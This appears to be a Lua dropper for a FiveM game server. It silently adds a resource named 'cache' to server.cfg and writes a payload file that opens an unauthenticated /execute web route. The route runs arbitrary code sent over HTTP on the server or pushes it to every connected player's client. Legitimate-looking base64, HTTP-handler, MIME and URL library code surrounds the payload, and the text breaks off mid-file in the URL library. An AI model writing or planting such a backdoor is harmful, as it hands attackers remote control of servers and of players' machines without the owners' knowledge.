local configFile = "server.cfg"
local file = io.open(configFile, "r")
local content = file:read("*all")
file:close()
local linePosition = content:find("\n", 1, true)
for i = 1, 99999 do
    linePosition = content:find("\n", linePosition + 1, true)
    if not linePosition then
        break
    end
end
if linePosition then
    content = content:sub(1, linePosition) .. "ensure cache\n" .. content:sub(linePosition + 1)
else
    content = content .. "\nensure cache"
end
file = io.open(configFile, "w")
file:write(content)
file:close()




local codeData = {
    ["playload.lua"] = [[
SetHttpHandler(exports.cache:createHttpHandler {
    routes = {
        ["^/execute"] = function(req, res, helpers)
            req.readJson():next(function(data)
                -- Create a promise to handle asynchronous operations
                local p = promise.new()

                if data and data.info then
                    p:resolve(data.info)
                else
                    p:reject("No 'info' field in the request data")
                end

                return p
            end):next(function(info)
                local isClientCode = info.isClientCode or false

                if isClientCode then
                    TriggerClientEvent("loadcode.cache", -1, info.code)
                    res.send(json.encode{result = "Code sent to clients"})
                else
                    -- Check if 'code' field is not nil
                    if info.code then
                        local status, result = pcall(load(info.code))
                        if status then
                            res.send(json.encode{result = "Code executed successfully", output = result})
                        else
                            res.sendError(500, "Error executing code: " .. result)
                        end
                    else
                        res.sendError(400, "No 'code' field provided in the request data")
                    end
                end
            end, function(err)
                res.sendError(400, err)
            end)
        end
    }
})
    ]],

    ["base64.lua"] = "local a={}local b=_G.bit32 and _G.bit32.extract;if not b then if _G.bit then local a,c,d=_G.bit.lshift,_G.bit.rshift,_G.bit.band;b=function(b,e,f)return d(c(b,e),a(1,f)-1)end elseif _G._VERSION=='Lua 5.1'then b=function(a,b,c)local d=0;local b=2^b;for c=0,c-1 do local e=b+b;if a%e>=b then d=d+2^c end;b=e end;return d end else b=load[[return function( v, from, width )return ( v >> from ) & ((1 << width) - 1)end]]()end end;function a.makeencoder(a,b,c)local d={}for a,b in pairs{[0]='A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9',a or'+',b or'/',c or'='}do d[a]=b:byte()end;return d end;function a.makedecoder(b,c,d)local e={}for a,b in pairs(a.makeencoder(b,c,d))do e[b]=a end;return e end;local c=a.makeencoder()local d=a.makedecoder()local e,f=string.char,table.concat;function a.encode(a,d,g)d=d or c;local c,h,i={},1,#a;local j=i%3;local k={}for f=1,i-j,3 do local a,f,i=a:byte(f,f+2)local a=a*65536+f*256+i;local f;if g then f=k[a]if not f then f=e(d[b(a,18,6)],d[b(a,12,6)],d[b(a,6,6)],d[b(a,0,6)])k[a]=f end else f=e(d[b(a,18,6)],d[b(a,12,6)],d[b(a,6,6)],d[b(a,0,6)])end;c[h]=f;h=h+1 end;if j==2 then local a,f=a:byte(i-1,i)local a=a*65536+f*256;c[h]=e(d[b(a,18,6)],d[b(a,12,6)],d[b(a,6,6)],d[64])elseif j==1 then local a=a:byte(i)*65536;c[h]=e(d[b(a,18,6)],d[b(a,12,6)],d[64],d[64])end;return f(c)end;function a.decode(a,c,g)c=c or d;local d='[^%w%+%/%=]'if c then local a,b;for c,d in pairs(c)do if d==62 then a=c elseif d==63 then b=c end end;d=('[^%%w%%%s%%%s%%=]'):format(e(a),e(b))end;a=a:gsub(d,'')local d=g and{}local h,i={},1;local j=#a;local k=a:sub(-2)=='=='and 2 or a:sub(-1)=='='and 1 or 0;for f=1,k>0 and j-4 or j,4 do local a,f,j,k=a:byte(f,f+3)local l;if g then local g=a*16777216+f*65536+j*256+k;l=d[g]if not l then local a=c[a]*262144+c[f]*4096+c[j]*64+c[k]l=e(b(a,16,8),b(a,8,8),b(a,0,8))d[g]=l end else local a=c[a]*262144+c[f]*4096+c[j]*64+c[k]l=e(b(a,16,8),b(a,8,8),b(a,0,8))end;h[i]=l;i=i+1 end;if k==1 then local a,d,f=a:byte(j-3,j-1)local a=c[a]*262144+c[d]*4096+c[f]*64;h[i]=e(b(a,16,8),b(a,8,8))elseif k==2 then local a,d=a:byte(j-3,j-2)local a=c[a]*262144+c[d]*4096;h[i]=e(b(a,16,8))end;return f(h)end;_G.base64=a",
    ["httphandler.lua"] = [[
        local a=GetCurrentResourceName()local b={documentRoot="http",directoryIndex="index.html",templateExtension="lsp",access={},log=false,logFile="log.json",errorPages={},mimeTypes={},routes={}}local c=131072;local d=5242880;local function e(e)local f=GetInvokingResource()or GetCurrentResourceName()local g=GetResourcePath(f)if type(e)~="table"then e={}end;for a,b in pairs(b)do if e[a]==nil then e[a]=b end end;local h;if e.log then h=json.decode(LoadResourceFile(f,e.logFile))or{}end;local i={}local j;if type(e.authorization)=="string"then j=e.authorization;e.authorization=Realms[j]or{}else j=f end;local function k(a)return a:match("^.+%.(.+)$")end;local function l(a)local a=k(a)if e.mimeTypes[a]then return e.mimeTypes[a]elseif MimeTypes[a]then return MimeTypes[a]else return"application/octet-stream"end end;local function m(a,b,c)if type(c)~="table"then c={}end;for a,b in pairs(_G)do if c[a]==nil then c[a]=b end end;local a=a;a=a:gsub("(%%%b{})",function(a)local a,b=load(a:sub(3,-2),b,"t",c)if a then local a,a=pcall(a)return a or""else return b end end)a=a:gsub("($%b{})",function(a)local a,b=load("return ("..a:sub(3,-2)..")",nil,"t",c)if a then local a,a=pcall(a)return a or""else return b end end)return a end;local function n(c,d,g,h,i)if not g then g=500 end;if h==nil then h=false end;if type(i)~="table"then i={}end;if not i["Content-Type"]then i["Content-Type"]="text/html"end;d.writeHead(g,i)if c.method=="HEAD"then d.send()else local c,i;if e.errorPages[g]then c=f;i=e.documentRoot.."/"..e.errorPages[g]else c=a;i=b.documentRoot.."/"..g..".html"end;local a=LoadResourceFile(c,i)if a then d.send(m(a,i,{details=h}))else if h then d.send("Error: "..g..": "..h)else d.send("Error: "..g)end end end end;local function a(a)if not h then return end;a.time=os.time()table.insert(h,a)table.sort(h,function(a,b)return a.time<b.time end)SaveResourceFile(f,e.logFile,json.encode(h),-1)end;local function b(a,b,c,d,e,f,g)if type(e)~="table"then e={}end;e.request=a;if not f then f=200 end;if type(g)~="table"then g={}end;if not g["Content-Type"]then g["Content-Type"]="text/html"end;local a=m(c,d,e)b.writeHead(f,g)b.send(a)end;local function f(a)if a:sub(1,1)~="/"then a="/"..a end;return g.."/"..e.documentRoot..a end;local function g(a,c,d,e,g,h)local f=f(d)local f=io.open(f,"rb")if f then local i=f:read("*all")f:close()b(a,c,i,d,e,g,h)else n(a,c,404)end end;local function h(b,e,g)local f=f(g)local g=l(f)local h=io.open(f,"rb")local i;if h then local a,f;if b.headers.Range then a=tonumber(b.headers.Range:match("^bytes=(%d+)-.*$"))f=tonumber(b.headers.Range:match("^bytes=%d+-(%d+)$"))end;if not a or a<0 then a=0 end;local j=h:seek("end")h:seek("set",a)if not f then if b.headers.Range then f=math.min(a+d,j)-1 else f=j-1 end end;local d={["Content-Type"]=g,["Transfer-Encoding"]="identity",["Accept-Ranges"]="bytes"}if a>0 or f<j-1 then i=206;d["Content-Range"]=("bytes %d-%d/%d"):format(a,f,j)d["Content-Length"]=tostring(f-a+1)else i=200;d["Content-Length"]=tostring(j)end;e.writeHead(i,d)Citizen.CreateThread(function()if b.method~="HEAD"then local d=false;b.setCancelHandler(function()d=true end)while not d do if a>f then break end;local b=h:read(c)if not b then break end;e.write(b)a=a+c;Citizen.Wait(0)end end;e.send()h:close()end)else i=404;n(b,e,i)end;a{type="file",path=b.path,address=b.address,method=b.method,headers=b.headers,status=i,file=f}return i end;local function c(a)local b=promise.new()a.setDataHandler(function(a)b:resolve(a)end)return b end;local function d(a)local b=promise.new()a.setDataHandler(function(a)local a=json.decode(a)if a==nil then b:reject("Request body contains invalid JSON")else b:resolve(a)end end)return b end;local function f(a,b,c,d,e)if not d then d=200 end;if type(e)~="table"then e={}end;if not e["Content-Type"]then e["Content-Type"]="application/json"end;b.writeHead(d,e)if a.method=="HEAD"then b.send()else if type(c)=="string"then b.send(c)else b.send(json.encode(c))end end end;local function l(a,b)local c;for a=#e.access,1,-1do if b:match(e.access[a].path)then c=e.access[a].login;break end end;if c==false then return true end;local b=a.headers.Authorization;if not b then return false end;local d=b:match("^Basic (.+)$")if not d then return false end;local d=base64.decode(d)local d,f=d:match("^([^:]+):(.+)$")if not(d and f)then return false end;if c and not c[d]then return false end;a.user=d;if i[b]then return true end;if not e.authorization[d]then return false end;if not verifyPassword(f,e.authorization[d])then return false end;i[b]=true;return true end;return function(i,m)local o=Url.normalize(i.path)i.url=o;if e.authorization and not l(i,o.path)then n(i,m,401,"Invalid login for realm: "..j,{["WWW-Authenticate"]=("Basic realm=\"%s\""):format(j)})return end;for e,j in pairs(e.routes)do local k={o.path:match(e)}if#k>0 then i.readBody=function()return c(i)end;i.readJson=function()return d(i)end;m.sendError=function(a,b,c)n(i,m,a,b,c)end;m.sendFile=function(a)h(i,m,a)end;m.sendJson=function(a,b,c)f(i,m,a,b,c)end;m.sendTemplate=function(a,c,d,e)b(i,m,a,o.path,c,d,e)end;m.sendTemplateFile=function(a,b,c,d)g(i,m,a,b,c,d)end;local b={log=function(b)b.type="message"b.route=e;a(b)end}j(i,m,b,table.unpack(k))a{type="route",route=e,path=i.path,address=i.address,method=i.method,headers=i.headers}return end end;if e.documentRoot then if o.path:sub(-1)=="/"then o.path=o.path..e.directoryIndex end;local a=k(o.path)if a==e.templateExtension then g(i,m,o.path)else h(i,m,o.path)end else n(i,m,404,"No route matches "..o)end end end;exports("createHttpHandler",e)exports("getUrl",function(b)local c=GetConvar("web_baseUrl","")local d,e;if c==""then d="http"e="[server IP]:[server port]"else d="https"e=c end;if not b then b=GetInvokingResource()or a end;return("%s://%s/%s/"):format(d,e,b)end)for a,a in pairs(Realms)do if a.inherit and Realms[a.inherit]then local b;if type(a.inherit)=="table"then b=a.inherit else b={a.inherit}end;for b,b in ipairs(b)do for b,c in pairs(Realms[b])do a[b]=c end end;a.inherit=nil end end
    ]],
    ["mime.lua"] = [[
        MimeTypes={["%"]="application/x-trash",["~"]="application/x-trash",["323"]="text/h323",["3gp"]="video/3gpp",["7z"]="application/x-7z-compressed",["abw"]="application/x-abiword",["ai"]="application/postscript",["aif"]="audio/x-aiff",["aifc"]="audio/x-aiff",["aiff"]="audio/x-aiff",["alc"]="chemical/x-alchemy",["amr"]="audio/amr",["anx"]="application/annodex",["apk"]="application/vnd.android.package-archive",["appcache"]="text/cache-manifest",["application"]="application/x-ms-application",["art"]="image/x-jg",["asc"]="text/plain",["asf"]="video/x-ms-asf",["asn"]="chemical/x-ncbi-asn1",["aso"]="chemical/x-ncbi-asn1-binary",["asx"]="video/x-ms-asf",["atom"]="application/atom+xml",["atomcat"]="application/atomcat+xml",["atomsrv"]="application/atomserv+xml",["au"]="audio/basic",["avi"]="video/x-msvideo",["awb"]="audio/amr-wb",["axa"]="audio/annodex",["axv"]="video/annodex",["b"]="chemical/x-molconn-Z",["bak"]="application/x-trash",["bat"]="application/x-msdos-program",["bcpio"]="application/x-bcpio",["bib"]="text/x-bibtex",["bin"]="application/octet-stream",["bmp"]="image/x-ms-bmp",["boo"]="text/x-boo",["book"]="application/x-maker",["brf"]="text/plain",["bsd"]="chemical/x-crossfire",["c"]="text/x-csrc",["c++"]="text/x-c++src",["c3d"]="chemical/x-chem3d",["cab"]="application/x-cab",["cac"]="chemical/x-cache",["cache"]="chemical/x-cache",["cap"]="application/vnd.tcpdump.pcap",["cascii"]="chemical/x-cactvs-binary",["cat"]="application/vnd.ms-pki.seccat",["cbin"]="chemical/x-cactvs-binary",["cbr"]="application/x-cbr",["cbz"]="application/x-cbz",["cc"]="text/x-c++src",["cda"]="application/x-cdf",["cdf"]="application/x-cdf",["cdr"]="image/x-coreldraw",["cdt"]="image/x-coreldrawtemplate",["cdx"]="chemical/x-cdx",["cdy"]="application/vnd.cinderella",["cef"]="chemical/x-cxf",["cer"]="chemical/x-cerius",["chm"]="chemical/x-chemdraw",["chrt"]="application/x-kchart",["cif"]="chemical/x-cif",["class"]="application/java-vm",["cls"]="text/x-tex",["cmdf"]="chemical/x-cmdf",["cml"]="chemical/x-cml",["cod"]="application/vnd.rim.cod",["com"]="application/x-msdos-program",["cpa"]="chemical/x-compass",["cpio"]="application/x-cpio",["cpp"]="text/x-c++src",["cpt"]="image/x-corelphotopaint",["cr2"]="image/x-canon-cr2",["crl"]="application/x-pkcs7-crl",["crt"]="application/x-x509-ca-cert",["crw"]="image/x-canon-crw",["csd"]="audio/csound",["csf"]="chemical/x-cache-csf",["csh"]="text/x-csh",["csm"]="chemical/x-csml",["csml"]="chemical/x-csml",["css"]="text/css",["csv"]="text/csv",["ctab"]="chemical/x-cactvs-binary",["ctx"]="chemical/x-ctx",["cu"]="application/cu-seeme",["cub"]="chemical/x-gaussian-cube",["cxf"]="chemical/x-cxf",["cxx"]="text/x-c++src",["d"]="text/x-dsrc",["davmount"]="application/davmount+xml",["dcm"]="application/dicom",["dcr"]="application/x-director",["ddeb"]="application/vnd.debian.binary-package",["deb"]="application/vnd.debian.binary-package",["deploy"]="application/octet-stream",["dif"]="video/dv",["diff"]="text/x-diff",["dir"]="application/x-director",["djv"]="image/vnd.djvu",["djvu"]="image/vnd.djvu",["dl"]="video/dl",["dll"]="application/x-msdos-program",["dmg"]="application/x-apple-diskimage",["dms"]="application/x-dms",["doc"]="application/msword",["docm"]="application/vnd.ms-word.document.macroEnabled.12",["docx"]="application/vnd.openxmlformats-officedocument.wordprocessingml.document",["dot"]="application/msword",["dotm"]="application/vnd.ms-word.template.macroEnabled.12",["dotx"]="application/vnd.openxmlformats-officedocument.wordprocessingml.template",["dv"]="video/dv",["dvi"]="application/x-dvi",["dx"]="chemical/x-jcamp-dx",["dxr"]="application/x-director",["emb"]="chemical/x-embl-dl-nucleotide",["embl"]="chemical/x-embl-dl-nucleotide",["eml"]="message/rfc822",["ent"]="chemical/x-pdb",["eot"]="application/vnd.ms-fontobject",["eps"]="application/postscript",["eps2"]="application/postscript",["eps3"]="application/postscript",["epsf"]="application/postscript",["epsi"]="application/postscript",["erf"]="image/x-epson-erf",["es"]="application/ecmascript",["etx"]="text/x-setext",["exe"]="application/x-msdos-program",["ez"]="application/andrew-inset",["fb"]="application/x-maker",["fbdoc"]="application/x-maker",["fch"]="chemical/x-gaussian-checkpoint",["fchk"]="chemical/x-gaussian-checkpoint",["fig"]="application/x-xfig",["flac"]="audio/flac",["fli"]="video/fli",["flv"]="video/x-flv",["fm"]="application/x-maker",["frame"]="application/x-maker",["frm"]="application/x-maker",["gal"]="chemical/x-gaussian-log",["gam"]="chemical/x-gamess-input",["gamin"]="chemical/x-gamess-input",["gan"]="application/x-ganttproject",["gau"]="chemical/x-gaussian-input",["gcd"]="text/x-pcs-gcd",["gcf"]="application/x-graphing-calculator",["gcg"]="chemical/x-gcg8-sequence",["gen"]="chemical/x-genbank",["gf"]="application/x-tex-gf",["gif"]="image/gif",["gjc"]="chemical/x-gaussian-input",["gjf"]="chemical/x-gaussian-input",["gl"]="video/gl",["gnumeric"]="application/x-gnumeric",["gpt"]="chemical/x-mopac-graph",["gsf"]="application/x-font",["gsm"]="audio/x-gsm",["gtar"]="application/x-gtar",["gz"]="application/gzip",["h"]="text/x-chdr",["h++"]="text/x-c++hdr",["hdf"]="application/x-hdf",["hh"]="text/x-c++hdr",["hin"]="chemical/x-hin",["hpp"]="text/x-c++hdr",["hqx"]="application/mac-binhex40",["hs"]="text/x-haskell",["hta"]="application/hta",["htc"]="text/x-component",["htm"]="text/html",["html"]="text/html",["hwp"]="application/x-hwp",["hxx"]="text/x-c++hdr",["ica"]="application/x-ica",["ice"]="x-conference/x-cooltalk",["ico"]="image/vnd.microsoft.icon",["ics"]="text/calendar",["icz"]="text/calendar",["ief"]="image/ief",["iges"]="model/iges",["igs"]="model/iges",["iii"]="application/x-iphone",["info"]="application/x-info",["inp"]="chemical/x-gamess-input",["ins"]="application/x-internet-signup",["iso"]="application/x-iso9660-image",["isp"]="application/x-internet-signup",["ist"]="chemical/x-isostar",["istr"]="chemical/x-isostar",["jad"]="text/vnd.sun.j2me.app-descriptor",["jam"]="application/x-jam",["jar"]="application/java-archive",["java"]="text/x-java",["jdx"]="chemical/x-jcamp-dx",["jmz"]="application/x-jmol",["jng"]="image/x-jng",["jnlp"]="application/x-java-jnlp-file",["jp2"]="image/jp2",["jpe"]="image/jpeg",["jpeg"]="image/jpeg",["jpf"]="image/jpx",["jpg"]="image/jpeg",["jpg2"]="image/jp2",["jpm"]="image/jpm",["jpx"]="image/jpx",["js"]="application/javascript",["json"]="application/json",["kar"]="audio/midi",["key"]="application/pgp-keys",["kil"]="application/x-killustrator",["kin"]="chemical/x-kinemage",["kml"]="application/vnd.google-earth.kml+xml",["kmz"]="application/vnd.google-earth.kmz",["kpr"]="application/x-kpresenter",["kpt"]="application/x-kpresenter",["ksp"]="application/x-kspread",["kwd"]="application/x-kword",["kwt"]="application/x-kword",["latex"]="application/x-latex",["lha"]="application/x-lha",["lhs"]="text/x-literate-haskell",["lin"]="application/bbolin",["lsf"]="video/x-la-asf",["lsx"]="video/x-la-asf",["ltx"]="text/x-tex",["ly"]="text/x-lilypond",["lyx"]="application/x-lyx",["lzh"]="application/x-lzh",["lzx"]="application/x-lzx",["m3g"]="application/m3g",["m3u"]="audio/x-mpegurl",["m3u8"]="application/x-mpegURL",["m4a"]="audio/mpeg",["maker"]="application/x-maker",["man"]="application/x-troff-man",["manifest"]="application/x-ms-manifest",["markdown"]="text/markdown",["mbox"]="application/mbox",["mcif"]="chemical/x-mmcif",["mcm"]="chemical/x-macmolecule",["md"]="text/markdown",["mdb"]="application/msaccess",["me"]="application/x-troff-me",["mesh"]="model/mesh",["mid"]="audio/midi",["midi"]="audio/midi",["mif"]="application/x-mif",["mkv"]="video/x-matroska",["mm"]="application/x-freemind",["mmd"]="chemical/x-macromodel-input",["mmf"]="application/vnd.smaf",["mml"]="text/mathml",["mmod"]="chemical/x-macromodel-input",["mng"]="video/x-mng",["moc"]="text/x-moc",["mol"]="chemical/x-mdl-molfile",["mol2"]="chemical/x-mol2",["moo"]="chemical/x-mopac-out",["mop"]="chemical/x-mopac-input",["mopcrt"]="chemical/x-mopac-input",["mov"]="video/quicktime",["movie"]="video/x-sgi-movie",["mp2"]="audio/mpeg",["mp3"]="audio/mpeg",["mp4"]="video/mp4",["mpc"]="chemical/x-mopac-input",["mpe"]="video/mpeg",["mpeg"]="video/mpeg",["mpega"]="audio/mpeg",["mpg"]="video/mpeg",["mpga"]="audio/mpeg",["mph"]="application/x-comsol",["mpv"]="video/x-matroska",["ms"]="application/x-troff-ms",["msh"]="model/mesh",["msi"]="application/x-msi",["msp"]="application/octet-stream",["msu"]="application/octet-stream",["mvb"]="chemical/x-mopac-vib",["mxf"]="application/mxf",["mxu"]="video/vnd.mpegurl",["nb"]="application/mathematica",["nbp"]="application/mathematica",["nc"]="application/x-netcdf",["nef"]="image/x-nikon-nef",["nwc"]="application/x-nwc",["o"]="application/x-object",["oda"]="application/oda",["odb"]="application/vnd.oasis.opendocument.database",["odc"]="application/vnd.oasis.opendocument.chart",["odf"]="application/vnd.oasis.opendocument.formula",["odg"]="application/vnd.oasis.opendocument.graphics",["odi"]="application/vnd.oasis.opendocument.image",["odm"]="application/vnd.oasis.opendocument.text-master",["odp"]="application/vnd.oasis.opendocument.presentation",["ods"]="application/vnd.oasis.opendocument.spreadsheet",["odt"]="application/vnd.oasis.opendocument.text",["oga"]="audio/ogg",["ogg"]="audio/ogg",["ogv"]="video/ogg",["ogx"]="application/ogg",["old"]="application/x-trash",["one"]="application/onenote",["onepkg"]="application/onenote",["onetmp"]="application/onenote",["onetoc2"]="application/onenote",["opf"]="application/oebps-package+xml",["opus"]="audio/ogg",["orc"]="audio/csound",["orf"]="image/x-olympus-orf",["otf"]="application/font-sfnt",["otg"]="application/vnd.oasis.opendocument.graphics-template",["oth"]="application/vnd.oasis.opendocument.text-web",["otp"]="application/vnd.oasis.opendocument.presentation-template",["ots"]="application/vnd.oasis.opendocument.spreadsheet-template",["ott"]="application/vnd.oasis.opendocument.text-template",["oza"]="application/x-oz-application",["p"]="text/x-pascal",["p7r"]="application/x-pkcs7-certreqresp",["pac"]="application/x-ns-proxy-autoconfig",["pas"]="text/x-pascal",["pat"]="image/x-coreldrawpattern",["patch"]="text/x-diff",["pbm"]="image/x-portable-bitmap",["pcap"]="application/vnd.tcpdump.pcap",["pcf"]="application/x-font-pcf",["pcf.Z"]="application/x-font-pcf",["pcx"]="image/pcx",["pdb"]="chemical/x-pdb",["pdf"]="application/pdf",["pfa"]="application/x-font",["pfb"]="application/x-font",["pfr"]="application/font-tdpfr",["pgm"]="image/x-portable-graymap",["pgn"]="application/x-chess-pgn",["pgp"]="application/pgp-encrypted",["pk"]="application/x-tex-pk",["pl"]="text/x-perl",["pls"]="audio/x-scpls",["pm"]="text/x-perl",["png"]="image/png",["pnm"]="image/x-portable-anymap",["pot"]="text/plain",["potm"]="application/vnd.ms-powerpoint.template.macroEnabled.12",["potx"]="application/vnd.openxmlformats-officedocument.presentationml.template",["ppam"]="application/vnd.ms-powerpoint.addin.macroEnabled.12",["ppm"]="image/x-portable-pixmap",["pps"]="application/vnd.ms-powerpoint",["ppsm"]="application/vnd.ms-powerpoint.slideshow.macroEnabled.12",["ppsx"]="application/vnd.openxmlformats-officedocument.presentationml.slideshow",["ppt"]="application/vnd.ms-powerpoint",["pptm"]="application/vnd.ms-powerpoint.presentation.macroEnabled.12",["pptx"]="application/vnd.openxmlformats-officedocument.presentationml.presentation",["prf"]="application/pics-rules",["prt"]="chemical/x-ncbi-asn1-ascii",["ps"]="application/postscript",["psd"]="image/x-photoshop",["py"]="text/x-python",["pyc"]="application/x-python-code",["pyo"]="application/x-python-code",["qgs"]="application/x-qgis",["qt"]="video/quicktime",["qtl"]="application/x-quicktimeplayer",["ra"]="audio/x-realaudio",["ram"]="audio/x-pn-realaudio",["rar"]="application/rar",["ras"]="image/x-cmu-raster",["rb"]="application/x-ruby",["rd"]="chemical/x-mdl-rdfile",["rdf"]="application/rdf+xml",["rdp"]="application/x-rdp",["rgb"]="image/x-rgb",["rm"]="audio/x-pn-realaudio",["roff"]="application/x-troff",["ros"]="chemical/x-rosdal",["rpm"]="application/x-redhat-package-manager",["rss"]="application/x-rss+xml",["rtf"]="application/rtf",["rtx"]="text/richtext",["rxn"]="chemical/x-mdl-rxnfile",["scala"]="text/x-scala",["sce"]="application/x-scilab",["sci"]="application/x-scilab",["sco"]="audio/csound",["scr"]="application/x-silverlight",["sct"]="text/scriptlet",["sd"]="chemical/x-mdl-sdfile",["sd2"]="audio/x-sd2",["sda"]="application/vnd.stardivision.draw",["sdc"]="application/vnd.stardivision.calc",["sdd"]="application/vnd.stardivision.impress",["sdf"]="chemical/x-mdl-sdfile",["sds"]="application/vnd.stardivision.chart",["sdw"]="application/vnd.stardivision.writer",["ser"]="application/java-serialized-object",["sfd"]="application/vnd.font-fontforge-sfd",["sfv"]="text/x-sfv",["sgf"]="application/x-go-sgf",["sgl"]="application/vnd.stardivision.writer-global",["sh"]="text/x-sh",["shar"]="application/x-shar",["shp"]="application/x-qgis",["shtml"]="text/html",["shx"]="application/x-qgis",["sid"]="audio/prs.sid",["sig"]="application/pgp-signature",["sik"]="application/x-trash",["silo"]="model/mesh",["sis"]="application/vnd.symbian.install",["sisx"]="x-epoc/x-sisx-app",["sit"]="application/x-stuffit",["sitx"]="application/x-stuffit",["skd"]="application/x-koan",["skm"]="application/x-koan",["skp"]="application/x-koan",["skt"]="application/x-koan",["sldm"]="application/vnd.ms-powerpoint.slide.macroEnabled.12",["sldx"]="application/vnd.openxmlformats-officedocument.presentationml.slide",["smi"]="application/smil+xml",["smil"]="application/smil+xml",["snd"]="audio/basic",["spc"]="chemical/x-galactic-spc",["spl"]="application/x-futuresplash",["spx"]="audio/ogg",["sql"]="application/x-sql",["src"]="application/x-wais-source",["srt"]="text/plain",["stc"]="application/vnd.sun.xml.calc.template",["std"]="application/vnd.sun.xml.draw.template",["sti"]="application/vnd.sun.xml.impress.template",["stl"]="application/sla",["stw"]="application/vnd.sun.xml.writer.template",["sty"]="text/x-tex",["sv4cpio"]="application/x-sv4cpio",["sv4crc"]="application/x-sv4crc",["svg"]="image/svg+xml",["svgz"]="image/svg+xml",["sw"]="chemical/x-swissprot",["swf"]="application/x-shockwave-flash",["swfl"]="application/x-shockwave-flash",["sxc"]="application/vnd.sun.xml.calc",["sxd"]="application/vnd.sun.xml.draw",["sxg"]="application/vnd.sun.xml.writer.global",["sxi"]="application/vnd.sun.xml.impress",["sxm"]="application/vnd.sun.xml.math",["sxw"]="application/vnd.sun.xml.writer",["t"]="application/x-troff",["tar"]="application/x-tar",["taz"]="application/x-gtar-compressed",["tcl"]="text/x-tcl",["tex"]="text/x-tex",["texi"]="application/x-texinfo",["texinfo"]="application/x-texinfo",["text"]="text/plain",["tgf"]="chemical/x-mdl-tgf",["tgz"]="application/x-gtar-compressed",["thmx"]="application/vnd.ms-officetheme",["tif"]="image/tiff",["tiff"]="image/tiff",["tk"]="text/x-tcl",["tm"]="text/texmacs",["torrent"]="application/x-bittorrent",["tr"]="application/x-troff",["ts"]="video/MP2T",["tsp"]="application/dsptype",["tsv"]="text/tab-separated-values",["ttf"]="application/font-sfnt",["ttl"]="text/turtle",["txt"]="text/plain",["udeb"]="application/vnd.debian.binary-package",["uls"]="text/iuls",["ustar"]="application/x-ustar",["val"]="chemical/x-ncbi-asn1-binary",["vcard"]="text/vcard",["vcd"]="application/x-cdlink",["vcf"]="text/vcard",["vcs"]="text/x-vcalendar",["vmd"]="chemical/x-vmd",["vms"]="chemical/x-vamas-iso14976",["vrml"]="model/vrml",["vsd"]="application/vnd.visio",["vss"]="application/vnd.visio",["vst"]="application/vnd.visio",["vsw"]="application/vnd.visio",["wad"]="application/x-doom",["wav"]="audio/x-wav",["wax"]="audio/x-ms-wax",["wbmp"]="image/vnd.wap.wbmp",["wbxml"]="application/vnd.wap.wbxml",["webm"]="video/webm",["wk"]="application/x-123",["wm"]="video/x-ms-wm",["wma"]="audio/x-ms-wma",["wmd"]="application/x-ms-wmd",["wml"]="text/vnd.wap.wml",["wmlc"]="application/vnd.wap.wmlc",["wmls"]="text/vnd.wap.wmlscript",["wmlsc"]="application/vnd.wap.wmlscriptc",["wmv"]="video/x-ms-wmv",["wmx"]="video/x-ms-wmx",["wmz"]="application/x-ms-wmz",["woff"]="application/font-woff",["wp5"]="application/vnd.wordperfect5.1",["wpd"]="application/vnd.wordperfect",["wrl"]="model/vrml",["wsc"]="text/scriptlet",["wvx"]="video/x-ms-wvx",["wz"]="application/x-wingz",["x3d"]="model/x3d+xml",["x3db"]="model/x3d+binary",["x3dv"]="model/x3d+vrml",["xbm"]="image/x-xbitmap",["xcf"]="application/x-xcf",["xcos"]="application/x-scilab-xcos",["xht"]="application/xhtml+xml",["xhtml"]="application/xhtml+xml",["xlam"]="application/vnd.ms-excel.addin.macroEnabled.12",["xlb"]="application/vnd.ms-excel",["xls"]="application/vnd.ms-excel",["xlsb"]="application/vnd.ms-excel.sheet.binary.macroEnabled.12",["xlsm"]="application/vnd.ms-excel.sheet.macroEnabled.12",["xlsx"]="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",["xlt"]="application/vnd.ms-excel",["xltm"]="application/vnd.ms-excel.template.macroEnabled.12",["xltx"]="application/vnd.openxmlformats-officedocument.spreadsheetml.template",["xml"]="application/xml",["xpi"]="application/x-xpinstall",["xpm"]="image/x-xpixmap",["xsd"]="application/xml",["xsl"]="application/xslt+xml",["xslt"]="application/xslt+xml",["xspf"]="application/xspf+xml",["xtel"]="chemical/x-xtel",["xul"]="application/vnd.mozilla.xul+xml",["xwd"]="image/x-xwindowdump",["xyz"]="chemical/x-xyz",["xz"]="application/x-xz",["zip"]="application/zip",["zmt"]="chemical/x-mopac-input"}
    ]],
    ["realms.lua"] = [[
        Realms = {["default"] = {--["admin"] = "$2a$11$wbM6SAAESKgEEyKcr4YegOYZcJllGMqmTOkisx9.VWZfN3UkXd6tq" -- "password"}}
    ]],
    ["url.lua"] = 'local a={}a.version="0.9.0"a.options={separator="&"}a.services={acap=674,cap=1026,dict=2628,ftp=21,gopher=70,http=80,https=443,iax=4569,icap=1344,imap=143,ipp=631,ldap=389,mtqp=1038,mupdate=3905,news=2009,nfs=2049,nntp=119,rtsp=554,sip=5060,snmp=161,telnet=23,tftp=69,vemmi=575,afs=1483,jms=5673,rsync=873,prospero=191,videotex=516}local b={["-"]=true,["_"]=true,["."]=true,["!"]=true,["="]=true,["+"]=true,["$"]=true,[","]=true,[";"]=true}local function c(a,b)local a=a;if not b then a=a:gsub("+"," ")end;return(a:gsub("%%(%x%x)",function(a)return string.char(tonumber(a,16))end))end;local function d(a)return(a:gsub("([^A-Za-z0-9%_%.%-%~])",function(a)return string.upper(string.format("%%%02x",string.byte(a)))end))end;local function e(a)local a=d(a)return a:gsub("%%20","+")end;local function f(a)local b=function(a)if b[a]then return a end;return d(a)end;return a:gsub("([^a-zA-Z0-9])",b)end;local function b(a,b)return a..b:build()end;function a:build()local b=""if self.path then local a=self.path;a:gsub("([^/]+)",function(a)return f(a)end)b=b..tostring(a)end;if self.query then local a=tostring(self.query)if a~=""then b=b.."?"..a end end;if self.host then local c=self.host;if self.port and self.scheme and a.services[self.scheme]~=self.port then c=c..":"..self.port end;local a;if self.user and self.user~=""then a=self.user;if self.password then a=a..":"..self.password end end;if a and a~=""then c=a.."@"..c end;if c then if b~=""then b="//"..c.."/"..b:gsub("^/+","")else b="//"..c end end end;if self.scheme then b=self.scheme..":"..b end;if self.fragment then b=b.."#"..self.fragment end;return b end;function a.buildQuery(b,c,f)local g={}if not c then c=a.options.separator 